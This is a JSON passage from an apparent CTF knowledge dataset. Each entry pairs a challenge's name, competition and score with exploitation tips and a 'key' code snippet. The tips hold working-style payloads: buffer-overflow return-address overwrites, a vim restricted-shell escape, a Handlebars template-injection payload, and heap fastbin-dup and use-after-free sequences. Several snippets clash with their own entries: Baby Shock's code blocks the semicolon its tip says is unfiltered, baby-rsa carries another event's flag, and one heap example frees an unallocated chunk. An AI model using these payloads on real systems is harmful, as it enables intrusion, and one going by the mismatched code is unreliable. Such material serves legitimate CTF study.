            "When developing exploits, especially in constrained or unusual environments (e.g., Linux applications running Windows binaries through Wine), reproducing the exact remote environment locally is crucial for the successful development and execution of exploits. Differences in environment setup, such as Wine configurations, can lead to discrepancies between local testing and remote exploitation outcomes. By mirroring the remote environment as closely as possible, including software versions and configuration settings, one can minimize these differences and ensure that an exploit that works locally will also work when deployed against the remote target.\n\n    Example approach for environment replication:\n    - Ensure the local testing environment matches the remote environment's specifications (OS version, kernel version, software packages, etc.).\n    - Use Docker or similar containerization tools to quickly spin up environments that mimic the target setup, including the installation of specific software versions indicated by the challenge (e.g., using the same Dockerfile provided in the challenge).\n    - Consider potential environment-specific mechanisms (e.g., Wine's implementation details) that might affect how memory is managed or how binaries are executed, and adjust the exploit approach accordingly."
        ],
        "key": "```rust\nstruct Buffer {\n    size: u64,\n    buffer_ptr: *mut u8,\n    size_duplicated: u64,\n}\n\nimpl Buffer {\n    fn new(size: u64) -> Self {\n        let buffer_ptr = unsafe { libc::malloc(size as usize) as *mut u8 };\n        Buffer {\n            size,\n            buffer_ptr,\n            size_duplicated: size,\n        }\n    }\n\n    fn drop(&mut self) {\n        unsafe {\n            libc::free(self.buffer_ptr as *mut libc::c_void);\n        }\n        self.buffer_ptr = std::ptr::null_mut();\n    }\n\n    fn read(&self) -> Vec<u8> {\n        unsafe { std::slice::from_raw_parts(self.buffer_ptr, self.size as usize).to_vec() }\n    }\n\n    fn write(&mut self, data: &[u8]) {\n        unsafe {\n            std::ptr::copy_nonoverlapping(data.as_ptr(), self.buffer_ptr, data.len());\n        }\n    }\n}\n\nfn main() {\n    let mut buffers: Vec<Buffer> = Vec::new();\n\n    loop {\n        println!(\"1. allocate\");\n        println!(\"2. drop\");\n        println!(\"3. read\");\n        println!(\"4. write\");\n        println!(\"5. quit\");\n        println!(\"choice?\");\n\n        let mut choice = String::new();\n        std::io::stdin().read_line(&mut choice).unwrap();\n        let choice = choice.trim().parse::<u32>().unwrap();\n\n        match choice {\n            1 => {\n                println!(\"size?\");\n                let mut size = String::new();\n                std::io::stdin().read_line(&mut size).unwrap();\n                let size = size.trim().parse::<u64>().unwrap();\n                buffers.push(Buffer::new(size));\n            }\n            2 => {\n                println!(\"index?\");\n                let mut index = String::new();\n                std::io::stdin().read_line(&mut index).unwrap();\n                let index = index.trim().parse::<usize>().unwrap();\n                buffers[index].drop();\n            }\n            3 => {\n                println!(\"index?\");\n                let mut index = String::new();\n                std::io::stdin().read_line(&mut index).unwrap();\n                let index = index.trim().parse::<usize>().unwrap();\n                let data = buffers[index].read();\n                println!(\"{:?}\", data);\n            }\n            4 => {\n                println!(\"index?\");\n                let mut index = String::new();\n                std::io::stdin().read_line(&mut index).unwrap();\n                let index = index.trim().parse::<usize>().unwrap();\n                println!(\"data?\");\n                let mut data = String::new();\n                std::io::stdin().read_line(&mut data).unwrap();\n                buffers[index].write(data.as_bytes());\n            }\n            5 => break,\n            _ => println!(\"Invalid choice\"),\n        }\n    }\n}\n```"
    },
    {
        "name": "Baby MD5",
        "write_up": "dataset/raw/Baby MD5.md",
        "type": "The type of this CTF challenge is crypto.",
        "competition": [
            "ASIS/2020/Finals",
            "https://ctftime.org/event/1111/tasks/"
        ],
        "score": 78,
        "max_score": 500,
        "difficulty": 0.156,
        "knowledge": [
            "In challenges requiring the generation of strings that produce hash values with specific characteristics (e.g., ending with certain hex digits or matching certain patterns), a practical approach involves iteratively generating strings and computing their hash values until a match is found. This can be done by either generating random strings of the required length or incrementing a counter padded to the required length and calculating its hash. Depending on the exact requirements (e.g., length and hash function specified), this iterative method can find a match within a feasible amount of time due to the limited search space defined by the challenge parameters.\n   - Example payload generation approach: \n     ```python\n     import random, string, hashlib\n     def generate_string_matching_hash_suffix(target_suffix, length, hash_function):\n         while True:\n             candidate = ''.join(random.choice(string.ascii_letters) for _ in range(length))  # Or use a padded counter string\n             if hash_function(candidate.encode('utf-8')).hexdigest().endswith(target_suffix):\n                 return candidate\n     ```",
            "For challenges involving finding two strings that, after being hashed multiple times (possibly with different iteration counts), result in the same hash value, one approach is to exploit predictable patterns in the hash output or specific conditions (e.g., a fixed prefix might coincide with hex characters). If the conditions allow (e.g., when the hash function is MD5 and the iteration count for one string is higher than the other), one can find a string that hashes to a required pattern after a certain number of iterations. This string can then serve as the input for the lower iteration count, ensuring both strings eventually hash to the same value after their respective number of iterations.\n   - Example approach:\n     ```python\n     import hashlib\n     def find_matching_hash_pair(m, n, x_head, y_head, hash_function):\n         while True:\n             x = x_head + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))\n             x_hash = x\n             for _ in range(m-n):  # Adjust based on iteration difference\n                 x_hash = hash_function(x_hash.encode('utf-8')).hexdigest()\n             if x_hash.startswith(y_head):  # Assuming y_head is a pattern like 'dead'\n                 y = x_hash\n                 return (x, y)\n     ```"
        ],
        "key": "```python  \ndef babymd5(m, n, x_head, y_head, x, y):  \n if x.startswith(x_head) and y.startswith(y_head):  \n   for _ in range(m):  \n     xhash = md5(x.encode('utf-8')).hexdigest()  \n     x = xhash  \n   for _ in range(n):  \n     yhash = md5(y.encode('utf-8')).hexdigest()  \n     y = yhash  \n   if xhash == yhash:  \n     return True  \nreturn False  \n```  "
    },
    {
        "name": "Baby Onion",
        "write_up": "dataset/raw/Baby Onion.md",
        "type": "This CTF challenge appears to be a crypto type challenge.",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When encountering a file with unknown content or extension, the first step should be to use a tool like `file` to identify the content type, which might reveal it as ASCII text or another recognizable format. This foundational step can guide the subsequent analysis or decoding efforts appropriate for the content type detected.",
            "In cybersecurity challenges, encoded data can be layered, requiring iterative decoding processes. When the data is encoded using multiple algorithms (e.g., hexadecimal and Base64), a recursive or iterative decoding script in a language like Python can be written to automate the decoding process until the hidden message or flag is revealed. Iterating between different decoding schemes based on the data's appearance (e.g., presence of base64 padding, hexadecimal characters) can efficiently uncover nested encodings.\n\nExample iterative decoding process in Python:\n```python\nimport base64\n\n# Assuming `data` is the encoded string to start with.\nwhile True:\n    try:\n        # Attempt hexadecimal decoding\n        decoded = bytes.fromhex(data).decode()\n        print(decoded)  # Optional: for verification\n        data = decoded\n    except ValueError:\n        # Hexadecimal decoding failed -> Attempt base64 decoding\n        decoded = base64.b64decode(data).decode()\n        print(decoded)  # Optional: for verification\n        data = decoded\n```"
        ],
        "key": "```python\nwhile True:  \n   decoded = bytes.fromhex(decode_b64).decode()  \n   print(decoded)  \n   decode_b64 = base64.b64decode(decoded).decode()  \n   print(decode_b64)  \n```"
    },
    {
        "name": "Baby Shock",
        "write_up": "dataset/raw/Baby Shock.md",
        "type": "misc",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 201,
        "max_score": 384,
        "difficulty": 0.5234375,
        "knowledge": [
            "When faced with a restricted shell environment where direct command execution is limited, methodical testing of syntax characters (like `;`, `&`, `|`, etc.) can help identify ways to bypass restrictions. If semicolon (`;`) is not filtered, it can be used to separate commands and execute additional commands outside of the restricted environment.\nExample payload: `id ; whoami`",
            "In scenarios where direct interactive shell access is denied, leveraging text editors that have command execution capabilities (e.g., `vim`, `emacs`, etc.) can be an effective workaround. By opening `vim` and then exiting to a command mode within it (`:shell`), one can escape a restricted shell and obtain a fully interactive shell environment.\nExample payload sequence: \n   1. Open `vim`: `id ;vim`\n   2. Exit to `vim` command mode: `exit`\n   3. Enter command mode in `vim`: `:shell`\n   4. Execute desired command: `/readflag`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid restricted_shell() {\n    char command[256];\n    while (1) {\n        printf(\"> \");\n        fgets(command, sizeof(command), stdin);\n        if (strncmp(command, \"exit\", 4) == 0) {\n            break;\n        }\n        if (strchr(command, ';') != NULL) {\n            printf(\"bad command: %s\", command);\n        } else {\n            system(command);\n        }\n    }\n}\n\nint main() {\n    printf(\"connected!\\n\");\n    printf(\"welcome to Baby shock, doo, doo, doo, doo, doo, doo!!!\\n\");\n    restricted_shell();\n    return 0;\n}\n```"
    },
    {
        "name": "Baby Web 1",
        "write_up": "dataset/raw/Baby Web 1.md",
        "type": "web",
        "competition": [
            "RaziCTF/2020",
            "https://ctftime.org/event/1167/tasks/"
        ],
        "score": 670,
        "max_score": 996,
        "difficulty": 0.6726907630522089,
        "knowledge": [
            "When dealing with PHP authentication systems where `password_hash()` and `password_verify()` are used, it is crucial to remember that using `PASSWORD_BCRYPT` for hashing will truncate the input to a maximum length of 72 characters. This behavior can be exploited in scenarios where bypassing authentication checks is needed, and the application does not correctly handle or validate input lengths before hashing. It's advisable to test inputs of varying lengths to observe any unexpected behavior, such as authentication bypass or incorrect handling of input data.",
            "In scenarios where a PHP application uses both `mb_strlen()` (which counts multibyte characters) and `strlen()` (which counts bytes), one can bypass checks that compare these lengths by crafting inputs that have a different number of multibyte characters versus bytes. By carefully selecting inputs where the byte length (`strlen()`) and character length (`mb_strlen()`) differ, one can exploit logic flaws in the application, especially in authentication or input validation mechanisms. This technique requires the crafted input to still be meaningful to the application logic or the specific vulnerability being exploited.  \nExample payload for the given scenario: `66842480683974257935677681585401189190148531340690145540123461534603155084209$(printf '\\u1337\\u1337')`"
        ],
        "key": "```php  \n<?php\n$prev_pass = \"66842480683974257935677681585401189190148531340690145540123461534603155084209704\";\nif ( isset($_GET[\"password\"])) {\n    if ( mb_strlen($_GET[\"password\"], 'utf8') < strlen($prev_pass)){\n        if ( strlen($_GET[\"password\"]) > mb_strlen($prev_pass, \"utf8\")){\n            $input_h = password_hash($_GET[\"password\"], PASSWORD_BCRYPT);\n            if ( password_verify($prev_pass, $input_h)){\n                echo exec(\"cat flag.txt\");\n                die();\n            } else {\n                echo \"Are you trying to hack me?!\";\n                die();\n            }\n        } else {\n            echo \"Nope\";\n            die();\n        }\n    } else {\n        echo \":/\";\n        die();\n    }\n} else {\n    highlight_file(__FILE__);\n    die();\n}\n?>\n```"
    },
    {
        "name": "baby-bof",
        "write_up": "dataset/raw/baby-bof.md",
        "type": "This write-up describes a buffer overflow challenge in which the goal is to exploit a vulnerability in the `vuln` function to jump to the `flag` function in order to obtain the flag. Based on the description and solution provided, this challenge falls under the category of `pwn` (short for \"binary exploitation\").",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 10,
        "max_score": 347,
        "difficulty": 0.02881844380403458,
        "knowledge": [
            "In buffer overflow challenges, when the program uses `gets()` for input, it's susceptible to buffer overflow due to `gets()`'s inability to check the length of the input against the buffer size. This can be exploited by crafting an input that fills the buffer and overwrites the return address on the stack with the address of a function (e.g., a `flag` function) that we want to execute. Example payload: `python -c \"print('A'*136 + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00')\" | ./binary`.",
            "If the binary has a misalignment issue causing a crash after a buffer overflow exploit, inserting a return (ret) gadget before the intended function address can help realign the stack. This technique is particularly useful when PIE (Position Independent Execution) is not enabled, allowing for hardcoded addresses. Find a `ret` gadget using a tool like ROPGadget, and place it before the target function address in the payload. Example payload for alignment correction: `python -c \"print('A'*136 + '\\xde\\x05\\x40\\x00\\x00\\x00\\x00\\x00' + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00')\" | ./binary`."
        ],
        "key": "```c\nvoid vuln(void)  \n{  \n char local_138 [304];  \n  \n gets(local_138);  \n return;  \n}\n```"
    },
    {
        "name": "baby-rsa",
        "write_up": "dataset/raw/baby-rsa.md",
        "type": "crypto",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 117,
        "max_score": 500,
        "difficulty": 0.234,
        "knowledge": [
            "When facing RSA encryption challenges where the exponent \\(e\\) is a perfect divisor of \\(p-1\\) and \\(q-1\\), employing the `nth_root()` function from SageMath can significantly simplify the process of decrypting RSA messages. This approach is particularly beneficial because it allows for direct extraction of all possible roots, a strategy applicable in scenarios where traditional RSA decryption methods are not straightforward due to unique properties of the RSA setup, such as the exponent \\(e\\) being a higher power and not just a simple divisor.\n   \n   Example command: `p_roots = mod(cipher, p).nth_root(e, all=True)`",
            "In RSA challenges, when the encryption modulus \\(N\\)'s prime factors \\(p\\) and \\(q\\) are known or can be easily determined using public factor databases like Factordb.com, computing the totient \\(\\phi(N)\\) and the decryption exponent \\(d\\) becomes possible. This enables decryption of the ciphertext \\(c\\) with \\(d\\), regardless of the size of \\(e\\), as long as \\(e\\) and \\(\\phi(N)\\) are coprime. This knowledge is especially useful in cases where the RSA challenge hints at or reveals an unusually large \\(e\\), and the direct factoring approach remains viable due to the manageable size of \\(N\\).\n\n   Example command to decrypt the ciphertext after finding \\(d\\): `m = pow(c, d, n)`"
        ],
        "key": "```python\ndef encrypt(message, e, N):\n    m = int.from_bytes(message.encode(), 'big')\n    c = pow(m, e, N)\n    return c\n\ndef decrypt(ciphertext, d, N):\n    m = pow(ciphertext, d, N)\n    message = m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()\n    return message\n\n# Example of vulnerable RSA parameters\np = 6072510988286929264894086362835077173625040072601309544494353950350290130736379974160352667353769493236336930449438771170009858935018137670526822423479179\nq = 7997416035266735376949323633693044943877117000985893501813767052682242347917960725109882869292648940863628350771736250400726013095444943539503502901307363\nN = p * q\ne = 31337\nphi_n = (p - 1) * (q - 1)\nd = pow(e, -1, phi_n)\n\n# Encrypt and decrypt a message\nmessage = \"S4CTF{Wh3n_mY_BrA1n_w45_UltR4_4CtIVe_ABOut_RSA!!!}\"\nciphertext = encrypt(message, e, N)\ndecrypted_message = decrypt(ciphertext, d, N)\n\nassert message == decrypted_message\n```"
    },
    {
        "name": "babybof",
        "write_up": "dataset/raw/babybof.md",
        "type": "reverse",
        "competition": [
            "castorsCTF/2020",
            "https://ctftime.org/event/1063/tasks/"
        ],
        "score": -1.0,
        "max_score": 496,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a buffer overflow vulnerability in a minimalistic binary with limited ROP gadgets, consider pivoting the stack into a writable section such as the BSS segment. This can enable further control over the program's flow, especially when the number of usable gadgets is low. Pivoting can be achieved by overwriting the saved base pointer (`rbp`) to point to a new location in the BSS segment and then returning to a `leave; ret;` gadget to set the stack pointer (`rsp`) to that new location.",
            "In scenarios where the global offset table (GOT) is read-only, but there is a need to execute system calls or functions from libc that are not directly callable from the binary's limited gadgets, leverage writable pointers to `stdin`, `stdout`, or `stderr` in the BSS section. By overwriting these pointers and controlling their use as function pointers or return addresses, one can indirectly manipulate the control flow to execute arbitrary code or system functions. This technique is particularly useful in constrained environments, like when trying to trigger a one-gadget execution in libc but unable to do so directly due to read-only restrictions on the GOT. \n\nExample Payload Segment for Stack Pivot:\n```php\n$payload = str_repeat(\"A\", 0x28) . pack(\"Q*\",\n    POPRBP, BSS + 0x50 + 0x20,\n    READ,\n);\n```\n\nExample Payload Segment for Partial Overwrite using stream buffer pointers:\n```php\n$payload .= str_repeat(\"\\x00\", 0x28);\n$payload .= pack(\"Q\", RET);  // Set up for return instruction to execute next instruction from overwritten pointer\n$payload .= substr(pack(\"Q\", $what), 0, 3);  // Overwrite least significant bytes of pointer to `stdin`, `stdout`, or `stderr`\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main() {\n    char buffer[32];\n    setbuf(stdin, NULL);\n    setbuf(stdout, NULL);\n    setbuf(stderr, NULL);\n    read(0, buffer, 0x200);\n    exit(0);\n}\n```"
    },
    {
        "name": "babybof1 pt1",
        "write_up": "dataset/raw/babybof1 pt1.md",
        "type": "pwn",
        "competition": [
            "castorsCTF/2020",
            "https://ctftime.org/event/1063/tasks/"
        ],
        "score": 86,
        "max_score": 496,
        "difficulty": 0.17338709677419356,
        "knowledge": [
            "When exploiting a buffer overflow vulnerability, identify the exact number of characters required to reach the return address in the program's memory. This calculation is critical to precisely overwrite the return address with the desired function's address. For example, in a situation where a buffer allocated 256 chars and observed through debugging (using gdb or similar tools) that the return address is overwritten after an additional 8 chars, the exact payload size before the desired function address should be 264 chars. Example payload part: \"A\"*264.",
            "To execute a function within a binary that is not directly called during normal execution (e.g., a hidden `get_flag()` function), the payload should include the function's address appended after the overflow characters. This address must be in little-endian format if the binary is executed on an x86_64 architecture with little endian byte order. Before crafting the payload, use a disassembler or debugger to find the memory address of the target function. Example payload part for an Intel x86_64 architecture system: \"\\xe7\\x06\\x40\\x00\\x00\\x00\\x00\\x00\", where `\\xe7\\x06\\x40\\x00\\x00\\x00\\x00\\x00` is the little-endian representation of the function's memory address."
        ],
        "key": "```c\nvoid main(void)\n{  \n char local_108 [256];  \n  \n puts(\"Welcome to the cybercastors Babybof\");  \n printf(\"Say your name: \");  \n gets(local_108);  \n return;  \n}  \n```"
    },
    {
        "name": "babyjeep",
        "write_up": "dataset/raw/babyjeep.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "When exploiting a double free vulnerability in a heap-based binary exploitation challenge, leveraging the fastbin dup technique allows for arbitrary write capability by taking advantage of the allocator's behavior. This technique involves performing specific sequences of allocations and deallocations (malloc and free calls) to manipulate the free list and create overlapping chunks. The exploit process typically involves creating a situation where a fastbin's free list points back to an already freed chunk, leading to a scenario where two allocations return the same memory address, allowing for controlled memory corruption. \n   - Example sequence to trigger fastbin dup:\n     ```python\n     malloc(0, 0x40, \"A\")  # Allocate chunk\n     free(0)               # Free it to add to fastbin\n     free(1)               # Free another chunk\n     malloc(0, 0x40, \"B\")  # This allocation will return the address of the first chunk\n     ```",
            "Exploitation of Use-After-Free (UAF) vulnerabilities can lead to information disclosure such as heap or libc addresses, which is crucial for bypassing modern exploit mitigation techniques such as Address Space Layout Randomization (ASLR). A UAF condition can be exploited by first freeing a chunk of memory and then interacting with the program in a way that causes it to read or write to the previously freed chunk, allowing attackers to leak memory addresses or corrupt memory. To leak addresses, an attacker can perform controlled allocations and deallocations to place a controlled pointer in the freed chunk and subsequently trigger a read operation on the chunk being used after it was freed.\n   - Example to leak an address via UAF:\n     ```python\n     free(1)                  # Free a chunk to create UAF\n     malloc(2, 0x40, p64(leak_target))  # Allocate a chunk where freed chunk's data is controlled\n     leaked_address = show(1)  # Trigger a read operation to leak the address\n     ```"
        ],
        "key": "```c\nvoid delete() {\n    int index;\n    puts(\"Index\");\n    scanf(\"%d\", &index);\n    if (index >= 0 && index <= 9) {\n        free(chungus[index]);\n    }\n}\n```"
    },
    {
        "name": "BabyJS",
        "write_up": "dataset/raw/BabyJS.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 248,
        "max_score": 906,
        "difficulty": 0.2737306843267108,
        "knowledge": [
            "When a web application employs a server-side template engine (like Handlebars in this scenario) and filters or conditions are part of the logic, clever use of the template engine's own functions or statements can allow for bypassing restrictions. To bypass a filter that blocks certain keywords (like \"FLAG\") and limitations on the content size:\n    - Employ template engine features to dynamically generate or manipulate the blocked term within the template rendering process itself. In the provided case, the use of `replace`, combined with scope movement using `#with` and `lookup` functions, facilitated the crafting of the keyword \"FLAG\" dynamically, avoiding direct filter triggers.\n    - Example payload: \n    ```\n    {{#with this as |k|}}\n      {{#with \"FLag\"}}\n        {{#with (replace \"ag\" \"AG\") as |payload|}}\n          {{lookup k payload}}\n        {{/with}}\n      {{/with}}\n    {{/with}}\n    ```",
            "Leveraging specific expressions in template engines like Handlebars to access environmental objects or variables indirectly. The exploit utilized the template's capability to interpret object properties (`this`) and execute functions (`replace`) or statements (`#with`, `lookup`) to indirectly access sensitive information or bypass restrictions based on content length or keyword banning. This can often be generalized in scenarios where user input might be rendered on the server side, enabling access to server-side variables:\n    - Use template syntax to manipulate or access variables indirectly when direct access is blocked or monitored. The approach can be particularly effective in environments where the template engine\u2019s context (`this`) includes sensitive data, or where the engine supports reflective operations on its context.\n    - Example payload cannot be simplified beyond the given complex Handlebars expression but the principle involves scope manipulation (`#with`), dynamic string manipulation (`replace`), and indirect data access (`lookup`) within the template's capabilities."
        ],
        "key": "```javascript\napp.post('/', (req, res) => {  \n   const { body: { content }, userDir, saveDir } = req;  \n   const filename = crypto.randomBytes(8).toString('hex');\n\n   let p = path.join('temp', userDir, filename)  \n  \n   fs.writeFile(`${path.join(saveDir, filename)}.html`, content, () => {  \n       res.redirect(`/?p=${p}`);  \n   })  \n});\n```"
    },
    {
        "name": "BabyKitDriver",
        "write_up": "dataset/raw/BabyKitDriver.md",
        "type": "pwn",
        "competition": [
            "0CTF/2023",
            "https://ctftime.org/event/2073/tasks/"
        ],
        "score": 647,
        "max_score": 664,
        "difficulty": 0.9743975903614458,
        "knowledge": [
            "In kernel exploitation, when attempting to bypass KASLR (Kernel Address Space Layout Randomization), a common technique involves leaking kernel stack contents. This can be achieved by exploiting a vulnerability that allows reading an arbitrary number of bytes from a kernel buffer, such as reading -1 bytes from a buffer with a specified size, which may lead to leaking kernel memory stack contents. This information can then be used to compute the kernel base address.",
            "Exploiting race conditions between reading and writing operations on kernel buffers can lead to arbitrary code execution. By preparing the memory layout appropriately and triggering a race condition where a write operation modifies a function pointer (e.g., v2.output) between the verification step and its usage by a concurrent read operation, an attacker can gain control over the instruction pointer (RIP) and subsequently execute arbitrary code. This technique may involve stabilizing the race condition by ensuring the payload is stored in advance to ensure the write operation completes with the intended malicious value."
        ],
        "key": "```cpp\nkern_return_t BabyKitDriverUserClient::baby_read(void *ref, IOExternalMethodArguments *args) {  \n    BabyKitDriver *drv;  \n    kern_return_t ret;  \n    char buf_v1[256];  \n    char buf_v2[512];  \n    size_t size;  \n    bool is_v2;\n\n    drv = (BabyKitDriver *)getProvider();  \n    is_v2 = drv->is_v2;  \n    IOLog(\"BabyKitDriverUserClient::baby_read\\n\");  \n    IOLog(\"version:%lld\\n\", is_v2);  \n    if (!drv->message)  \n        return 0;  \n    if (is_v2) {  \n        size = args->scalarInput[1];  \n        if ((int64_t)size > (int64_t)drv->message->v2.size)  \n            size = drv->message->v2.size;  \n        memset(buf_v2, 0, sizeof(buf_v2));  \n        drv->message->v2.output(buf_v2, drv->message->v2.buf, drv->message->v2.size);  \n        ret = copyout(buf_v2, args->scalarInput[0], (size - 1) & 0xFFF);  \n    } else {  \n        memset(buf_v1, 0, sizeof(buf_v1));  \n        drv->message->v1.output(buf_v1, &drv->message->v1.buf);  \n        ret = copyout(buf_v1, args->scalarInput[0], 0x100);  \n    }  \n    return ret;  \n}\n\nkern_return_t BabyKitDriverUserClient::baby_leaveMessage(void *ref, IOExternalMethodArguments *args) {  \n    BabyKitDriver *drv;  \n    kern_return_t ret;  \n    __int64 is_v2;  \n    size_t size;\n\n    drv = (BabyKitDriver *)getProvider();  \n    is_v2 = args->scalarInput[0];  \n    IOLog(\"BabyKitDriverUserClient::baby_leaveMessage\\n\");  \n    if (!drv->message) {  \n        drv->message = (struct message *)IOMalloc(sizeof(struct message));  \n        if (is_v2)  \n            drv->message->v2.output = output2;  \n        else  \n            drv->message->v1.output = output1;  \n    }  \n    if (is_v2) {  \n        drv->message->v2.output = output2;  \n        size = args->scalarInput[2];  \n        if ((int64_t)size > 0x200)  \n            size = 0x200LL;  \n        drv->message->v2.size = size;  \n        ret = copyin(args->scalarInput[1], &drv->message->v2.buf, size);  \n    } else {  \n        drv->message->v1.output = output1;  \n        ret = copyin(args->scalarInput[1], &drv->message->v1.buf, 0x100uLL);  \n    }  \n    drv->is_v2 = is_v2;  \n    return ret;  \n}  \n```"
    },
    {
        "name": "babymips",
        "write_up": "dataset/raw/babymips.md",
        "type": "The challenge \"0CTF 2020 - baby MIPS\" is a reverse challenge.",
        "competition": [
            "0CTF/2020/Quals",
            "https://ctftime.org/event/1026/tasks/"
        ],
        "score": -1,
        "max_score": 846,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving ciphered text based on XOR and addition operations, always analyze the manipulation patterns. If each character of the input is XORed with a variable (e.g., the index `i`) and then a constant is added or subtracted (e.g., `+ 0x17`), consider using symbolic execution or constraint solvers like Z3 to systematically search for possible solutions. This strategy is effective when the cipher algorithm is relatively simple and operates on a linear transformation basis.",
            "When dealing with encrypted or encoded flags where the algorithm involves iterating through each character, applying a transformation, and comparing it to a provided sequence, consider using Python scripts combined with Z3 Solver. This approach allows specifying constraints for each character based on the observed transformation logic and systematically solving for possible plaintext inputs that satisfy all the constraints, leading directly to the decryption or decoding of the flag."
        ],
        "key": "```c\nint main(int argc, char* argv[])  \n{\n   char flag[90];\n   memset(flag, 0, 0x5A);  \n   read(0, flag, 0x3E);  \n   if (flag[0x3D] != '}' || strncmp(\"flag{\", flag, 5)) {  \n       puts(\"Wrong\");  \n   }\n\n   int j = -1;  \n   for (int i=5; i<0x3D; ++i) {  \n       while (tbl_A[++j]);\n\n       tbl_A[j] = flag[i];  \n   }\n\n   if (check_permutations()) {  \n       puts(\"Right\");  \n   } else {  \n       puts(\"Wrong\");  \n   }\n\n   return 0;  \n}\n```"
    },
    {
        "name": "babypwn",
        "write_up": "dataset/raw/babypwn.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 100,
        "max_score": 1337,
        "difficulty": 0.07479431563201197,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities where NX protection is disabled, allowing execution of injected shellcode, one can use the buffer overflow to overwrite the saved return instruction pointer (RIP) with the address of a buffer (for instance, 'username' variable holding the shellcode). This technique utilizes the fact that with NX disabled, the stack is executable ('rwx'), enabling direct execution of injected shellcode. A critical step is to ensure the shellcode is properly aligned and the overwrite targets the correct address to ensure execution.\n    - Example payload structure: `payload = nop_sled + shellcode + padding + overwritten_RIP_with_buffer_address`.",
            "In scenarios where format string vulnerabilities allow arbitrary read/write, a two-stage exploit can be performed. The first stage often involves leaking a libc address to calculate the libc base address. This can be achieved through format string vulnerabilities that allow leaking addresses from the stack. The second stage involves calculating the address of a \"one gadget\" (a single instruction that grants shell) based on the leaked libc address and overwriting a return address or function pointer to redirect execution flow to this gadget.\n    - Example payload for stage one (leak): `payload = fmtstr_payload_builder(\"leaked_address\")`.\n    - Example calculation for \"one gadget\" address: `one_gadget_address = libc_base + offset_to_one_gadget`."
        ],
        "key": "```c\nint check_user_hash(char* flag) {  \n   unsigned char user_md5[MD5_DIGEST_LENGTH * 2 + 1];  \n   unsigned char flag_md5[MD5_DIGEST_LENGTH];\n\n   /* calculate MD5(\"CSR{...}\") */  \n   calc_string_md5(flag, flag_md5);\n\n   /* read user input, convert to hexadecimal */  \n   gets(user_md5);  \n   hex_to_binary(user_md5, user_md5, strlen(user_md5));\n\n   return memcmp(flag_md5, user_md5, MD5_DIGEST_LENGTH) ? 0 : 1;  \n}  \n```"
    },
    {
        "name": "babyre2",
        "write_up": "dataset/raw/babyre2.md",
        "type": "reverse",
        "competition": [
            "RCTF/2018",
            "https://ctftime.org/event/624/tasks/"
        ],
        "score": 444,
        "max_score": 869,
        "difficulty": 0.5109321058688148,
        "knowledge": [
            "When analyzing binary files with complex assembly instructions, such as SSE (Streaming SIMD Extensions) instructions, it may sometimes be more effective to directly read the assembly rather than relying solely on high-level decompiler outputs. Decompilers can sometimes misinterpret or obscure the logic behind certain operations, especially with complex data manipulations performed by instructions like SSE. Directly reading the assembly can offer clearer insight into the operations being performed, such as data structure manipulations, bitwise operations, or specific algorithm implementations.",
            "In situations where the challenge involves solving linear congruence equations, as seen with operations that involve multiply-modulo-compare patterns, employing mathematical algorithms like Euclid's extended algorithm can significantly reduce the complexity of solving these equations. This approach is particularly advantageous when faced with large numbers (2^64 possibilities in this case) which make brute-forcing impractical or impossible. Utilizing the right algorithm can turn an otherwise intractable problem into one that can be solved efficiently.\n\nExample payload for solving linear congruence equations: \n\n```python\n# Python code snippet using Euclid's extended algorithm to solve linear congruence equations\ndef egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\n    else:\n        g, x, y = egcd(b % a, a)\n        return (g, y - (b // a) * x, x)\n\ndef mod_inv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('Modular inverse does not exist')\n    else:\n        return x % m\n\n# Example usage to solve: ax \u2261 1 (mod m)\na = 0x20656d6f636c6557  # Example 'a' value from the equations\nm = 0xFFFFFFFFFFFFFFC5  # The modulus\nx = mod_inv(a, m)  # Calculate the modular inverse of 'a'\nprint(\"The modular inverse is:\", hex(x))\n```\n\nThis script provides a template for solving equations of the form \\(ax \\equiv b \\, (\\text{mod } m)\\), which are common in cryptography and binary exploitation challenges."
        ],
